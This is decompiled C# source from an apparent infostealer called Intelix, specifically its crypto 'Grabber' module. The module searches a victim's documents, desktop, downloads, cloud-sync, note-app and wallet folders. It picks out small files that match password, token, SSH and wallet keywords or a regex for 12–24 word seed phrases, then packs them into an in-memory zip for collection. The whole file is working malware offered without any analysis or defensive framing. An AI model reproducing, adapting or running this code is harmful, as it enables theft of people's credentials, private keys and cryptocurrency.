using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Intelix.Helper;
using Intelix.Helper.Data;

namespace Intelix.Targets.Crypto
{
	// Token: 0x02000036 RID: 54
	public class Grabber : ITarget
	{
		// Token: 0x17000001 RID: 1
		// (get) Token: 0x060000A9 RID: 169 RVA: 0x00009848 File Offset: 0x00007A48
		// (set) Token: 0x060000AA RID: 170 RVA: 0x00009865 File Offset: 0x00007A65
		private long Size
		{
			get
			{
				return Interlocked.Read(ref this._size);
			}
			set
			{
				Interlocked.Exchange(ref this._size, value);
			}
		}

		// Token: 0x060000AB RID: 171 RVA: 0x00009878 File Offset: 0x00007A78
		public void Collect(InMemoryZip zip, Counter counter)
		{
			Parallel.ForEach<string>(this._seedPaths, delegate(string directory)
			{
				this.SearchFiles(zip, counter, directory);
			});
		}

		// Token: 0x060000AC RID: 172 RVA: 0x000098BC File Offset: 0x00007ABC
		private void SearchFiles(InMemoryZip zip, Counter counter, string directory)
		{
			bool flag = this.Size > this._sizeLimit;
			if (!flag)
			{
				try
				{
					Parallel.ForEach<string>(Directory.GetDirectories(directory), delegate(string subDir)
					{
						bool flag2 = this.Size <= this._sizeLimit;
						if (flag2)
						{
							this.SearchFiles(zip, counter, subDir);
						}
					});
				}
				catch
				{
				}
				try
				{
					Parallel.ForEach<string>(Directory.GetFiles(directory), delegate(string file)
					{
						bool flag2 = this.Size <= this._sizeLimit;
						if (flag2)
						{
							FileInfo fileInfo = new FileInfo(file);
							bool flag3 = this._seedExtensions.Contains(fileInfo.Extension, StringComparer.OrdinalIgnoreCase) && fileInfo.Length < this._sizeLimitFile && fileInfo.Length > this._sizeMinFile;
							if (flag3)
							{
								string text = File.ReadAllText(fileInfo.FullName);
								bool flag4 = this.ContainsKeyword(fileInfo.Name) || this.ContainsKeyword(text) || this.ContainsSeedPhrase(text);
								if (flag4)
								{
									this.Size += fileInfo.Length;
									string text2 = "Files\\" + fileInfo.Name + RandomStrings.GenerateHashTag() + fileInfo.Extension;
									zip.AddTextFile(text2, text);
									counter.FilesGrabber.Add(file + " => " + text2);
								}
							}
						}
					});
				}
				catch
				{
				}
			}
		}

		// Token: 0x060000AD RID: 173 RVA: 0x0000995C File Offset: 0x00007B5C
		private bool ContainsSeedPhrase(string content)
		{
			return this._seedRegex.IsMatch(content);
		}

		// Token: 0x060000AE RID: 174 RVA: 0x0000997C File Offset: 0x00007B7C
		private bool ContainsKeyword(string content)
		{
			bool flag = string.IsNullOrEmpty(content);
			bool result2;
			if (flag)
			{
				result2 = false;
			}
			else
			{
				string[] source = content.Split(new char[]
				{
					' ',
					'\t',
					'\r',
					'\n',
					',',
					'.',
					';',
					':',
					'-',
					'_',
					'/',
					'\\',
					'"',
					'\''
				}, StringSplitOptions.RemoveEmptyEntries);
				HashSet<string> whitelist = new HashSet<string>(this._keywords, StringComparer.OrdinalIgnoreCase);
				HashSet<string> blacklist = new HashSet<string>(this._blacklist, StringComparer.OrdinalIgnoreCase);
				int result = 0;
				Parallel.ForEach<string>(source, delegate(string word, ParallelLoopState state)
				{
					bool flag2 = Volatile.Read(ref result) == -1;
					if (flag2)
					{
						state.Stop();
					}
					else
					{
						bool flag3 = blacklist.Contains(word);
						if (flag3)
						{
							Interlocked.Exchange(ref result, -1);
							state.Stop();
						}
						else
						{
							bool flag4 = whitelist.Contains(word);
							if (flag4)
							{
								Interlocked.CompareExchange(ref result, 1, 0);
							}
						}
					}
				});
				result2 = (result == 1);
			}
			return result2;
		}

		// Token: 0x0400000A RID: 10
		private readonly long _sizeMinFile = 120L;

		// Token: 0x0400000B RID: 11
		private readonly long _sizeLimitFile = 6144L;

		// Token: 0x0400000C RID: 12
		private readonly long _sizeLimit = 5242880L;

		// Token: 0x0400000D RID: 13
		private long _size;

		// Token: 0x0400000E RID: 14
		private readonly Regex _seedRegex = new Regex("^(?:\\s*\\b[a-z]{3,}\\b){12,24}\\s*$", RegexOptions.IgnoreCase | RegexOptions.Multiline | RegexOptions.Compiled);

		// Token: 0x0400000F RID: 15
		private readonly string[] _blacklist = new string[]
		{
			"license",
			"readme",
			"changelog",
			"about",
			"terms",
			"eula",
			"notice",
			"example",
			"sample",
			"test"
		};

		// Token: 0x04000010 RID: 16
		private readonly string[] _keywords = new string[]
		{
			"password",
			"passwd",
			"pwd",
			"pass",
			"login",
			"user",
			"username",
			"account",
			"mail",
			"email",
			"secret",
			"key",
			"private",
			"public",
			"wallet",
			"mnemonic",
			"seed",
			"recovery",
			"phrase",
			"backup",
			"pin",
			"auth",
			"2fa",
			"token",
			"apikey",
			"api_key",
			"ssh",
			"cert",
			"certificate",
			"crypto",
			"btc",
			"eth",
			"usdt",
			"ltc",
			"xmr"
		};

		// Token: 0x04000011 RID: 17
		private readonly string[] _seedExtensions = new string[]
		{
			".seed",
			".seedphrase",
			".mnemonic",
			".phrase",
			".key",
			".secret",
			".txt",
			".backup",
			".wallet"
		};

		// Token: 0x04000012 RID: 18
		private readonly string[] _seedPaths = new string[]
		{
			Environment.GetFolderPath(Environment.SpecialFolder.Personal),
			Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
			Environment.GetFolderPath(Environment.SpecialFolder.Personal),
			Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
			Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory),
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\OneDrive",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Dropbox",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\iCloudDrive",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Google Drive",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\YandexDisk",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Mega",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Evernote",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Standard Notes",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Joplin",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Wallets",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Keys",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Crypto",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Backup"
		};
	}
}
